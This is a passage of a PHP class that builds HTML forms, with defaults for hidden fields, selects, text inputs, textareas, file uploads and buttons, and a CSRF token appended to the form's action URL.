            $form[ "button" ][ "id" ] = "";
        }
        if ( ( ! isset( $form[ "button" ][ "name" ] ) ) || ( ! is_string ( $form[ "button" ][ "name" ] ) ) ) {
            $form[ "button" ][ "name" ] = "";
        }
        if ( ( ! isset( $form[ "button" ][ "type" ] ) ) || ( ! is_string ( $form[ "button" ][ "type" ] ) ) ) {
            $form[ "button" ][ "type" ] = "button";
        }
        if ( ( ! isset( $form[ "button" ][ "value" ] ) ) || ( ! is_string ( $form[ "button" ][ "value" ] ) ) ) {
            $form[ "button" ][ "value" ] = " button ";
        }
        if ( ( ! isset( $form[ "button" ][ "title" ] ) ) || ( ! is_string ( $form[ "button" ][ "title" ] ) ) ) {
            $form[ "button" ][ "title" ] = "";
        }
        if ( ( ! isset( $form[ "button" ][ "disabled" ] ) ) || ( ! is_string ( $form[ "button" ][ "disabled" ] ) ) ) {
            $form[ "button" ][ "disabled" ] = "";
        }
        if ( ( ! isset( $form[ "button" ][ "events" ] ) ) || ( ! is_array ( $form[ "button" ][ "events" ] ) ) ) {
            $form[ "button" ][ "events" ] = array ();
        }
        $_event_processing = '';
        foreach ( $form[ "button" ][ "events" ] as $event => $processing ) {
            if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
                $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
            }
        }
        $form[ "button" ][ "event_processing" ] = $_event_processing;
        if ( ( ! isset( $form[ "div_show_dyn_id" ] ) ) || ( ! is_string ( $form[ "div_show_dyn_id" ] ) ) || ( strlen ( $form[ "div_show_dyn_id" ] ) <= 0 ) ) {
            $form[ "div_show_dyn_id" ] = "div_show_dyn_form1";
        }
        return $form;
    }

    public static function form_page ( $top , $form , $bottom )
    {
        $form  = self ::init_form ( $form );
        $_html = self ::top ( $top ) . self ::form ( $form[ "action" ] , $form[ "hiddens" ] , $form[ "selects" ] , $form[ "inputs" ] , $form[ "textareas" ] , $form[ "files" ] , $form[ "gets" ] , $form[ "id" ] , $form[ "name" ] , $form[ "enctype" ] , $form[ "submit" ] , $form[ "reset" ] , $form[ "button" ] , $form[ "div_show_dyn_id" ] ) . self ::bottom ( $bottom );
        return $_html;
    }

    public static function form_body ( $form )
    {
        $form  = self ::init_form ( $form );
        $_html = self ::form ( $form[ "action" ] , $form[ "hiddens" ] , $form[ "selects" ] , $form[ "inputs" ] , $form[ "textareas" ] , $form[ "files" ] , $form[ "gets" ] , $form[ "id" ] , $form[ "name" ] , $form[ "enctype" ] , $form[ "submit" ] , $form[ "reset" ] , $form[ "button" ] , $form[ "div_show_dyn_id" ] );
        return $_html;
    }

    public static function form ( $action , $hiddens = array () , $selects = array () , $inputs = array () , $textareas = array () , $files = array () , $gets = array () , $form_id = "form_id_1" , $form_name = "form1" , $form_enctype = "multipart/form-data" , $submit = array () , $reset = array () , $button = array () , $div_show_dyn_id = "div_show_dyn_form1" )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ! empty( $action ) ) {
            if ( substr ( $action , 0 , 1 ) != "/" ) {
                $action = "/" . $action;
            }
            $_index_file_name = INDEX_FILE_URI;
            $action           = $_index_file_name . '?url=' . $action;
        }
        if ( ( empty( $form_id ) ) || ( ! is_string ( $form_id ) ) ) {
            $form_id = "form_id_0";
        }
        if ( ( empty( $form_name ) ) || ( ! is_string ( $form_name ) ) ) {
            $form_name = "form_0";
        }
        if ( ( empty( $form_enctype ) ) || ( ! is_string ( $form_enctype ) ) ) {
            $form_enctype = "multipart/form-data";
        }
        if ( ( ! empty( $gets ) ) && ( is_array ( $gets ) ) ) {
            foreach ( $gets as $k => $v ) {
                if ( is_string ( $k ) && ( ! Class_Base_Format ::is_integer ( $k ) ) ) {
                    $action .= '&' . $k . '=' . urlencode ( $v );
                }
            }
        }
        if ( empty( $gets[ "rand" ] ) ) {
            $action .= '&rand=' . rand ( 100000000000000000 , 999999999999999999 );
        }
        $action .= '&csrf=' . ( empty( $_SESSION[ "PHPSPLOIT_PERMISSION_CSRF" ] ) ? ( $_SESSION[ "PHPSPLOIT_PERMISSION_CSRF" ] = ( time () . rand ( 10000000 , 99999999 ) ) ) : $_SESSION[ "PHPSPLOIT_PERMISSION_CSRF" ] );
        $_form  = '';
        $_form  .= '<div>';
        $_form  .= '<form id="' . Class_Base_Format ::htmlentities ( $form_id ) . '" name="' . Class_Base_Format ::htmlentities ( $form_name ) . '" action="' . Class_Base_Format ::htmlentities ( $action ) . '" method="post" enctype="' . Class_Base_Format ::htmlentities ( $form_enctype ) . '" onsubmit="return to_submit(this);">';
        if ( ( ! isset( $submit ) ) || ( ! is_array ( $submit ) ) ) {
            $submit = array ();
        }
        if ( ( ! isset( $submit[ "display" ] ) ) || ( ! is_bool ( $submit[ "display" ] ) ) ) {
            $submit[ "display" ] = true;
        }
        if ( ( ! isset( $submit[ "id" ] ) ) || ( ! is_string ( $submit[ "id" ] ) ) ) {
            $submit[ "id" ] = ( "submit_" . 0 );
        }
        if ( ( ! isset( $submit[ "name" ] ) ) || ( ! is_string ( $submit[ "name" ] ) ) ) {
            $submit[ "name" ] = ( "submit_" . 0 );
        }
        if ( ( ! isset( $submit[ "type" ] ) ) || ( ! is_string ( $submit[ "type" ] ) ) ) {
            $submit[ "type" ] = "submit";
        }
        if ( ( ! isset( $submit[ "value" ] ) ) || ( ! is_string ( $submit[ "value" ] ) ) ) {
            $submit[ "value" ] = " submit ";
        }
        if ( ( ! isset( $submit[ "title" ] ) ) || ( ! is_string ( $submit[ "title" ] ) ) ) {
            $submit[ "title" ] = "";
        }
        if ( ( ! isset( $submit[ "disabled" ] ) ) || ( ! is_string ( $submit[ "disabled" ] ) ) ) {
            $submit[ "disabled" ] = "";
        }
        if ( ( ! isset( $submit[ "style" ] ) ) || ( ! is_string ( $submit[ "style" ] ) ) ) {
            $submit[ "style" ] = "";
        }
        if ( ( ! isset( $submit[ "events" ] ) ) || ( ! is_array ( $submit[ "events" ] ) ) ) {
            $submit[ "events" ] = array ();
        }
        if ( ( ! isset( $submit[ "event_processing" ] ) ) || ( ! is_string ( $submit[ "event_processing" ] ) ) ) {
            $_event_processing = '';
            foreach ( $submit[ "events" ] as $event => $processing ) {
                if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
                    $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
                }
            }
            $submit[ "event_processing" ] = $_event_processing;
        }
        if ( ( ! isset( $reset ) ) || ( ! is_array ( $reset ) ) ) {
            $reset = array ();
        }
        if ( ( ! isset( $reset[ "display" ] ) ) || ( ! is_bool ( $reset[ "display" ] ) ) ) {
            $reset[ "display" ] = true;
        }
        if ( ( ! isset( $reset[ "id" ] ) ) || ( ! is_string ( $reset[ "id" ] ) ) ) {
            $reset[ "id" ] = ( "reset_" . 0 );
        }
        if ( ( ! isset( $reset[ "name" ] ) ) || ( ! is_string ( $reset[ "name" ] ) ) ) {
            $reset[ "name" ] = ( "reset_" . 0 );
        }
        if ( ( ! isset( $reset[ "type" ] ) ) || ( ! is_string ( $reset[ "type" ] ) ) ) {
            $reset[ "type" ] = "reset";
        }
        if ( ( ! isset( $reset[ "value" ] ) ) || ( ! is_string ( $reset[ "value" ] ) ) ) {
            $reset[ "value" ] = " reset ";
        }
        if ( ( ! isset( $reset[ "title" ] ) ) || ( ! is_string ( $reset[ "title" ] ) ) ) {
            $reset[ "title" ] = "";
        }
        if ( ( ! isset( $reset[ "disabled" ] ) ) || ( ! is_string ( $reset[ "disabled" ] ) ) ) {
            $reset[ "disabled" ] = "";
        }
        if ( ( ! isset( $reset[ "style" ] ) ) || ( ! is_string ( $reset[ "style" ] ) ) ) {
            $reset[ "style" ] = "";
        }
        if ( ( ! isset( $reset[ "events" ] ) ) || ( ! is_array ( $reset[ "events" ] ) ) ) {
            $reset[ "events" ] = array ();
        }
        if ( ( ! isset( $reset[ "event_processing" ] ) ) || ( ! is_string ( $reset[ "event_processing" ] ) ) ) {
            $_event_processing = '';
            foreach ( $reset[ "events" ] as $event => $processing ) {
                if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
                    $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
                }
            }
            $reset[ "event_processing" ] = $_event_processing;
        }
        if ( ( ! isset( $button ) ) || ( ! is_array ( $button ) ) ) {
            $button = array ();
        }
        if ( ( ! isset( $button[ "display" ] ) ) || ( ! is_bool ( $button[ "display" ] ) ) ) {
            $button[ "display" ] = true;
        }
        if ( ( ! isset( $button[ "id" ] ) ) || ( ! is_string ( $button[ "id" ] ) ) ) {
            $button[ "id" ] = ( "button_" . 0 );
        }
        if ( ( ! isset( $button[ "name" ] ) ) || ( ! is_string ( $button[ "name" ] ) ) ) {
            $button[ "name" ] = ( "button_" . 0 );
        }
        if ( ( ! isset( $button[ "type" ] ) ) || ( ! is_string ( $button[ "type" ] ) ) ) {
            $button[ "type" ] = "button";
        }
        if ( ( ! isset( $button[ "value" ] ) ) || ( ! is_string ( $button[ "value" ] ) ) ) {
            $button[ "value" ] = " button ";
        }
        if ( ( ! isset( $button[ "title" ] ) ) || ( ! is_string ( $button[ "title" ] ) ) ) {
            $button[ "title" ] = "";
        }
        if ( ( ! isset( $button[ "disabled" ] ) ) || ( ! is_string ( $button[ "disabled" ] ) ) ) {
            $button[ "disabled" ] = "";
        }
        if ( ( ! isset( $button[ "style" ] ) ) || ( ! is_string ( $button[ "style" ] ) ) ) {
            $button[ "style" ] = "";
        }
        if ( ( ! isset( $button[ "events" ] ) ) || ( ! is_array ( $button[ "events" ] ) ) ) {
            $button[ "events" ] = array ();
        }
        if ( ( ! isset( $button[ "event_processing" ] ) ) || ( ! is_string ( $button[ "event_processing" ] ) ) ) {
            $_event_processing               = '';
            $button[ "events" ][ "onclick" ] = 'click_dyn_add_button("' . Class_Base_Format ::htmlentities ( $form_id ) . '","dyn_form_hidden_index_id");';
            foreach ( $button[ "events" ] as $event => $processing ) {
                if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
                    $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
                }
            }
            $button[ "event_processing" ] = $_event_processing;
        }
        $hiddens[] = array ( "id" => "dyn_form_hidden_index_id" , "name" => "dyn_form_hidden_index_name" , "value" => 0 , "events" => array () );
        foreach ( $hiddens as $hidden_index => $item ) {
            if ( ( ! isset( $item[ "id" ] ) ) || ( ! is_string ( $item[ "id" ] ) ) ) {
                $item[ "id" ] = ( "hiddens_" . $hidden_index );
            }
            if ( ( ! isset( $item[ "name" ] ) ) || ( ! is_string ( $item[ "name" ] ) ) ) {
                $item[ "name" ] = ( "hiddens_" . $hidden_index );
            }
            if ( ( ! isset( $item[ "value" ] ) ) || ( ( ! is_string ( $item[ "value" ] ) ) && ( ! is_numeric ( $item[ "value" ] ) ) ) ) {
                $item[ "value" ] = "";
            }
            if ( ( ! isset( $item[ "events" ] ) ) || ( ! is_array ( $item[ "events" ] ) ) ) {
                $item[ "events" ] = array ();
            }
            $_event_processing = '';
            foreach ( $item[ "events" ] as $event => $processing ) {
                if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
                    $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
                }
            }
            $_form .= '<input id="' . Class_Base_Format ::htmlentities ( $item[ "id" ] ) . '" name="' . Class_Base_Format ::htmlentities ( $item[ "name" ] ) . '" type="hidden" value="' . Class_Base_Format ::htmlentities ( $item[ "value" ] ) . '" ' . $_event_processing . '>';
        }
        $_form .= '<div>';
        foreach ( $selects as $select_index => $item ) {
            if ( ( ! isset( $item[ "id" ] ) ) || ( ! is_string ( $item[ "id" ] ) ) ) {
                $item[ "id" ] = ( "selects_" . $select_index );
            }
            if ( ( ! isset( $item[ "name" ] ) ) || ( ! is_string ( $item[ "name" ] ) ) ) {
                $item[ "name" ] = ( "selects_" . $select_index );
            }
            if ( ( ! isset( $item[ "explanatory_note" ] ) ) || ( ( ! is_string ( $item[ "explanatory_note" ] ) ) && ( ! is_numeric ( $item[ "explanatory_note" ] ) ) ) ) {
                $item[ "explanatory_note" ] = "";
            }
            if ( ( ! isset( $item[ "disabled" ] ) ) || ( ! is_string ( $item[ "disabled" ] ) ) ) {
                $item[ "disabled" ] = "";
            }
            if ( ( ! isset( $item[ "style" ] ) ) || ( ! is_string ( $item[ "style" ] ) ) ) {
                $item[ "style" ] = "";
            }
            if ( ( ! isset( $item[ "options" ] ) ) || ( ! is_array ( $item[ "options" ] ) ) ) {
                $item[ "options" ] = array ();
            }
            if ( ( ! isset( $item[ "events" ] ) ) || ( ! is_array ( $item[ "events" ] ) ) ) {
                $item[ "events" ] = array ();
            }
            $_event_processing = '';
            foreach ( $item[ "events" ] as $event => $processing ) {
                if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
                    $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
                }
            }
            $_form .= '<div style="margin-top: 32px;">';
            $_form .= '<table style="width:100%;font-size:18px;"><tr><td width="20%" style="text-align: left;">' . Class_Base_Format ::htmlentities ( $item[ "title" ] ) . '</td><td width="60%" style="text-align: center;"><select id="' . Class_Base_Format ::htmlentities ( $item[ "id" ] ) . '" name="' . Class_Base_Format ::htmlentities ( $item[ "name" ] ) . '" size="1" style="width:100%;height:32px;line-height:24px;font-size:18px;border-width:2px;text-align:center;' . Class_Base_Format ::htmlentities ( $item[ "style" ] ) . '"  ' . $item[ "disabled" ] . ' ' . $_event_processing . '><option value=""> ------ SELECT ------ </option>';
            foreach ( $item[ "options" ] as $option_index => $option ) {
                if ( isset( $option[ "value" ] ) ) {
                    if ( ( ! isset( $option[ "title" ] ) ) || ( ( ! is_string ( $option[ "title" ] ) ) && ( is_numeric ( $option[ "title" ] ) ) ) ) {
                        $option[ "title" ] = $option[ "value" ];
                    }
                    if ( ( ! isset( $option[ "describe" ] ) ) || ( ( ! is_string ( $option[ "describe" ] ) ) && ( is_numeric ( $option[ "describe" ] ) ) ) ) {
                        $option[ "describe" ] = $option[ "title" ];
                    }
                    if ( ( ! isset( $option[ "selected" ] ) ) || ( ( ! is_string ( $option[ "selected" ] ) ) ) ) {
                        $option[ "selected" ] = "";
                    }
                    $_form .= '<option title="' . Class_Base_Format ::htmlentities ( $option[ "describe" ] ) . '" value="' . Class_Base_Format ::htmlentities ( $option[ "value" ] ) . '" ' . $option[ "selected" ] . '>' . Class_Base_Format ::htmlentities ( $option[ "title" ] ) . '</option>';
                }
            }
            $_form .= '</select></td><td width="20%" style="padding-left:10px;text-align:left;color:red;">' . Class_Base_Format ::htmlentities ( $item[ "explanatory_note" ] ) . '</td></tr></table>';
            $_form .= '</div>';
        }
        $_form .= '</div>';
        $_form .= '<div>';
        foreach ( $inputs as $input_index => $item ) {
            if ( ( ! isset( $item[ "id" ] ) ) || ( ! is_string ( $item[ "id" ] ) ) ) {
                $item[ "id" ] = ( "inputs_" . $input_index );
            }
            if ( ( ! isset( $item[ "name" ] ) ) || ( ! is_string ( $item[ "name" ] ) ) ) {
                $item[ "name" ] = ( "inputs_" . $input_index );
            }
            if ( ( ! isset( $item[ "value" ] ) ) || ( ( ! is_string ( $item[ "value" ] ) ) && ( ! is_numeric ( $item[ "value" ] ) ) ) ) {
                $item[ "value" ] = "";
            }
            if ( ( ! isset( $item[ "title" ] ) ) || ( ( ! is_string ( $item[ "title" ] ) ) && ( ! is_numeric ( $item[ "title" ] ) ) ) ) {
                $item[ "title" ] = $item[ "value" ];
            }
            if ( ( ! isset( $item[ "describe" ] ) ) || ( ( ! is_string ( $item[ "describe" ] ) ) && ( ! is_numeric ( $item[ "describe" ] ) ) ) ) {
                $item[ "describe" ] = $item[ "value" ];
            }
            if ( ( ! isset( $item[ "explanatory_note" ] ) ) || ( ( ! is_string ( $item[ "explanatory_note" ] ) ) && ( ! is_numeric ( $item[ "explanatory_note" ] ) ) ) ) {
                $item[ "explanatory_note" ] = "";
            }
            if ( ( ! isset( $item[ "disabled" ] ) ) || ( ! is_string ( $item[ "disabled" ] ) ) ) {
                $item[ "disabled" ] = "";
            }
            if ( ( ! isset( $item[ "style" ] ) ) || ( ! is_string ( $item[ "style" ] ) ) ) {
                $item[ "style" ] = "";
            }
            if ( ( ! isset( $item[ "events" ] ) ) || ( ! is_array ( $item[ "events" ] ) ) ) {
                $item[ "events" ] = array ();
            }
            $_event_processing = '';
            foreach ( $item[ "events" ] as $event => $processing ) {
                if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
                    $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
                }
            }
            $_form .= '<div style="height:32px;"></div>';
            $_form .= '<div>';
            $_form .= '<table style="width:100%;line-height:24px;font-size:18px;"><tr><td width="20%" style="text-align: left;">' . Class_Base_Format ::htmlentities ( $item[ "title" ] ) . '</td><td width="60%">';
            $_form .= '<input id="' . Class_Base_Format ::htmlentities ( $item[ "id" ] ) . '" name="' . Class_Base_Format ::htmlentities ( $item[ "name" ] ) . '" type="text" title="' . Class_Base_Format ::htmlentities ( $item[ "describe" ] ) . '" style="width:100%;line-height:24px;font-size:18px;border-width:2px;text-align:center;' . Class_Base_Format ::htmlentities ( $item[ "style" ] ) . '"  value="' . Class_Base_Format ::htmlentities ( $item[ "value" ] ) . '" ' . Class_Base_Format ::htmlentities ( $item[ "disabled" ] ) . ' ' . $_event_processing . '>';
            $_form .= '</td><td width="20%" style="padding-left:10px;text-align:left;color:red;">' . Class_Base_Format ::htmlentities ( $item[ "explanatory_note" ] ) . '</td></tr></table>';
            $_form .= '</div>';
        }
        $_form .= '</div>';
        $_form .= '<div>';
        foreach ( $textareas as $textarea_index => $item ) {
            if ( ( ! isset( $item[ "id" ] ) ) || ( ! is_string ( $item[ "id" ] ) ) ) {
                $item[ "id" ] = ( "textareas_" . $textarea_index );
            }
            if ( ( ! isset( $item[ "name" ] ) ) || ( ! is_string ( $item[ "name" ] ) ) ) {
                $item[ "name" ] = ( "textareas_" . $textarea_index );
            }
            if ( ( ! isset( $item[ "value" ] ) ) || ( ( ! is_string ( $item[ "value" ] ) ) && ( ! is_numeric ( $item[ "value" ] ) ) ) ) {
                $item[ "value" ] = "";
            }
            if ( ( ! isset( $item[ "title" ] ) ) || ( ( ! is_string ( $item[ "title" ] ) ) && ( ! is_numeric ( $item[ "title" ] ) ) ) ) {
                $item[ "title" ] = $item[ "value" ];
            }
            if ( ( ! isset( $item[ "describe" ] ) ) || ( ( ! is_string ( $item[ "describe" ] ) ) && ( ! is_numeric ( $item[ "describe" ] ) ) ) ) {
                $item[ "describe" ] = $item[ "value" ];
            }
            if ( ( ! isset( $item[ "explanatory_note" ] ) ) || ( ( ! is_string ( $item[ "explanatory_note" ] ) ) && ( ! is_numeric ( $item[ "explanatory_note" ] ) ) ) ) {
                $item[ "explanatory_note" ] = "";
            }
            if ( ( ! isset( $item[ "disabled" ] ) ) || ( ! is_string ( $item[ "disabled" ] ) ) ) {
                $item[ "disabled" ] = "";
            }
            if ( ( ! isset( $item[ "style" ] ) ) || ( ! is_string ( $item[ "style" ] ) ) ) {
                $item[ "style" ] = "";
            }
            if ( ( ! isset( $item[ "events" ] ) ) || ( ! is_array ( $item[ "events" ] ) ) ) {
                $item[ "events" ] = array ();
            }
            $_event_processing = '';
            foreach ( $item[ "events" ] as $event => $processing ) {
                if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
                    $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
                }
            }
            $_form .= '<div style="height:32px;"></div>';
            $_form .= '<div>';
            $_form .= '<table style="width:100%;line-height:24px;font-size:18px;">';
            $_form .= '<tr>';
            $_form .= '<td width="20%" style="text-align: left;">';
            $_form .= Class_Base_Format ::htmlentities ( $item[ "title" ] );
            $_form .= '</td>';
            $_form .= '<td width="60%" style="text-align: left;">';
            $_form .= '<textarea id="' . Class_Base_Format ::htmlentities ( $item[ "id" ] ) . '" name="' . Class_Base_Format ::htmlentities ( $item[ "name" ] ) . '" style="width:100%;height:200px;font-size:18px;' . Class_Base_Format ::htmlentities ( $item[ "style" ] ) . '" ' . Class_Base_Format ::htmlentities ( $item[ "disabled" ] ) . ' ' . $_event_processing . ' title="' . Class_Base_Format ::htmlentities ( $item[ "describe" ] ) . '">' . Class_Base_Format ::htmlentities ( $item[ "value" ] ) . '</textarea>';
            $_form .= '</td>';
            $_form .= '<td width="20%" style="padding-left:10px;text-align: left;color:red;">';
            $_form .= Class_Base_Format ::htmlentities ( $item[ "explanatory_note" ] );
            $_form .= '</td>';
            $_form .= '</tr>';
            $_form .= '</table>';
            $_form .= '</div>';
        }
        $_form .= '</div>';
        $_form .= "<div>";
        foreach ( $files as $file_index => $item ) {
            if ( ( ! isset( $item[ "id" ] ) ) || ( ! is_string ( $item[ "id" ] ) ) ) {
                $item[ "id" ] = ( "files_" . $file_index );
            }
            if ( ( ! isset( $item[ "name" ] ) ) || ( ! is_string ( $item[ "name" ] ) ) ) {
                $item[ "name" ] = ( "files_" . $file_index );
            }
            if ( ( ! isset( $item[ "value" ] ) ) || ( ( ! is_string ( $item[ "value" ] ) ) && ( ! is_numeric ( $item[ "value" ] ) ) ) ) {
                $item[ "value" ] = "";
            }
            if ( ( ! isset( $item[ "title" ] ) ) || ( ( ! is_string ( $item[ "title" ] ) ) && ( ! is_numeric ( $item[ "title" ] ) ) ) ) {
                $item[ "title" ] = $item[ "value" ];
            }
            if ( ( ! isset( $item[ "describe" ] ) ) || ( ( ! is_string ( $item[ "describe" ] ) ) && ( ! is_numeric ( $item[ "describe" ] ) ) ) ) {
                $item[ "describe" ] = $item[ "value" ];
            }
            if ( ( ! isset( $item[ "explanatory_note" ] ) ) || ( ( ! is_string ( $item[ "explanatory_note" ] ) ) && ( ! is_numeric ( $item[ "explanatory_note" ] ) ) ) ) {
                $item[ "explanatory_note" ] = "";
            }
            if ( ( ! isset( $item[ "disabled" ] ) ) || ( ! is_string ( $item[ "disabled" ] ) ) ) {
                $item[ "disabled" ] = "";
            }
            if ( ( ! isset( $item[ "style" ] ) ) || ( ! is_string ( $item[ "style" ] ) ) ) {
                $item[ "style" ] = "";
            }
            if ( ( ! isset( $item[ "events" ] ) ) || ( ! is_array ( $item[ "events" ] ) ) ) {
                $item[ "events" ] = array ();
            }
            $_event_processing = '';
            foreach ( $item[ "events" ] as $event => $processing ) {
                if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
                    $_event_processing .= chr ( 32 ) . ( $event ) . chr ( 61 ) . chr ( 34 ) . ( $processing ) . chr ( 34 ) . chr ( 59 ) . chr ( 32 );
                }
            }
            $_form .= '<div style="height:32px;"></div>';
            $_form .= '<div>';
            $_form .= '<table style="width:100%;line-height:24px;font-size:18px;"><tr><td width="20%" style="text-align: left;">' . Class_Base_Format ::htmlentities ( $item[ "title" ] ) . '</td><td width="60%" style="text-align: left;">';
            $_form .= '<input id="' . Class_Base_Format ::htmlentities ( $item[ "id" ] ) . '" name="' . Class_Base_Format ::htmlentities ( $item[ "name" ] ) . '" type="file" title="' . Class_Base_Format ::htmlentities ( $item[ "describe" ] ) . '" style="width:100%;line-height:24px;font-size:18px;border-width:2px;text-align:left;' . Class_Base_Format ::htmlentities ( $item[ "style" ] ) . '"  value="' . Class_Base_Format ::htmlentities ( $item[ "value" ] ) . '" ' . Class_Base_Format ::htmlentities ( $item[ "disabled" ] ) . ' ' . $_event_processing . '>';
            $_form .= '</td><td width="20%" style="padding-left:10px;text-align:left;color:red;">' . Class_Base_Format ::htmlentities ( $item[ "explanatory_note" ] ) . '</td></tr></table>';
            $_form .= '</div>';
        }
        $_form .= "</div>";
        $_form .= '<div id="div_id_dyn_form_show_' . Class_Base_Format ::htmlentities ( $form_id ) . '" style="display: block;">';
        $_form .= '</div>';
        $_form .= '<div style="height:32px;"></div>';
        $_form .= '  <div>';
        $_form .= '    <table style="width:100%;line-height:28px;font-size:20px;">';
        $_form .= '      <tr>';
        $_form .= '        <td width="20%"></td><td width="20%">' . ( ( empty( $submit[ "display" ] ) ) ? "" : ( '<input id="' . Class_Base_Format ::htmlentities ( $submit[ "id" ] ) . '" name="' . Class_Base_Format ::htmlentities ( $submit[ "name" ] ) . '" type="' . Class_Base_Format ::htmlentities ( $submit[ "type" ] ) . '" value="&nbsp;' . Class_Base_Format ::htmlentities ( $submit[ "value" ] ) . '&nbsp;" ' . ( $submit[ "event_processing" ] ) . ' title="' . Class_Base_Format ::htmlentities ( $submit[ "value" ] ) . '" style="line-height:28px;font-size:20px;border-width:2px;' . Class_Base_Format ::htmlentities ( $submit[ "style" ] ) . '" >' ) ) . '</td>';
        $_form .= '        <td width="20%"></td><td width="20%">' . ( ( empty( $reset[ "display" ] ) ) ? "" : ( '<input id="' . Class_Base_Format ::htmlentities ( $reset[ "id" ] ) . '" name="' . Class_Base_Format ::htmlentities ( $reset[ "name" ] ) . '" type="' . Class_Base_Format ::htmlentities ( $reset[ "type" ] ) . '" value="&nbsp;' . Class_Base_Format ::htmlentities ( $reset[ "value" ] ) . '&nbsp;" ' . ( $reset[ "event_processing" ] ) . ' title="' . Class_Base_Format ::htmlentities ( $reset[ "title" ] ) . '" style="line-height:28px;font-size:20px;border-width:2px;' . Class_Base_Format ::htmlentities ( $reset[ "style" ] ) . '" >' ) ) . '</td>';
        $_form .= '        <td width="20%" style="text-align: center;">' . ( ( empty( $button[ "display" ] ) ) ? "" : ( '<input id="' . Class_Base_Format ::htmlentities ( $button[ "id" ] ) . '" name="' . Class_Base_Format ::htmlentities ( $button[ "name" ] ) . '" type="' . Class_Base_Format ::htmlentities ( $button[ "type" ] ) . '" value="&nbsp;' . Class_Base_Format ::htmlentities ( $button[ "value" ] ) . '&nbsp;" ' . ( $button[ "event_processing" ] ) . ' title="' . Class_Base_Format ::htmlentities ( $button[ "title" ] ) . '" style="line-height:28px;font-size:20px;border-width:2px;' . Class_Base_Format ::htmlentities ( $button[ "style" ] ) . '" >' ) ) . '</td>';
        $_form .= '      </tr>';
        $_form .= '    </table>';
        $_form .= '  </div>';
        $_form .= '</form>';
        $_form .= '</div>';
        return $_form;
    }

    public static function dyn_form_body ( $form )
    {
        $form  = self ::init_form ( $form );
        $_html = self ::dyn_form ( $form[ "hiddens" ] , $form[ "selects" ] , $form[ "inputs" ] , $form[ "textareas" ] , $form[ "files" ] , $form[ "submit" ] , $form[ "reset" ] , $form[ "button" ] , $form[ "id" ] , $form[ "style" ] );
        return $_html;
    }

    public static function dyn_form ( $hiddens = array () , $selects = array () , $inputs = array () , $textareas = array () , $files = array () , $submit = array () , $reset = array () , $button = array () , $div_id = "form_div_id" , $div_style = "display:none;" )
    {
        $_form = '';
        $_form .= '<div id="div_dyn_form_id_' . $div_id . '" style="' . $div_style . '">';
        if ( ! is_array ( $submit ) ) {
            $submit = array ();
        }
        if ( ( ! isset( $submit[ "name" ] ) ) || ( ! is_string ( $submit[ "name" ] ) ) ) {
            $submit[ "name" ] = "submit_0";
        }
        if ( ! is_array ( $reset ) ) {
            $reset = array ();
        }
        if ( ( ! isset( $reset[ "name" ] ) ) || ( ! is_string ( $reset[ "name" ] ) ) ) {
            $reset[ "name" ] = "reset_0";
        }
        if ( ! is_array ( $button ) ) {
            $button = array ();
        }
        if ( ( ! isset( $button[ "name" ] ) ) || ( ! is_string ( $button[ "name" ] ) ) ) {
            $button[ "name" ] = "button_0";
        }
        foreach ( $hiddens as $hidden_index => $item ) {
            if ( ( ! isset( $item[ "id" ] ) ) || ( ! is_string ( $item[ "id" ] ) ) ) {
                $item[ "id" ] = ( "hiddens_" . $hidden_index );
            }
            if ( ( ! isset( $item[ "name" ] ) ) || ( ! is_string ( $item[ "name" ] ) ) ) {
                $item[ "name" ] = ( "hiddens_" . $hidden_index );
            }
            if ( ( ! isset( $item[ "value" ] ) ) || ( ( ! is_string ( $item[ "value" ] ) ) && ( ! is_numeric ( $item[ "value" ] ) ) ) ) {
                $item[ "value" ] = "";
            }
            if ( ! isset( $item[ "events" ] ) ) {
                $item[ "events" ] = array ();
            }
            $_event_processing = '';
            foreach ( $item[ "events" ] as $event => $processing ) {
                if ( ( is_string ( $event ) ) & ( strlen ( $event ) > 0 ) && ( is_string ( $event ) ) && ( strlen ( $processing ) > 0 ) ) {
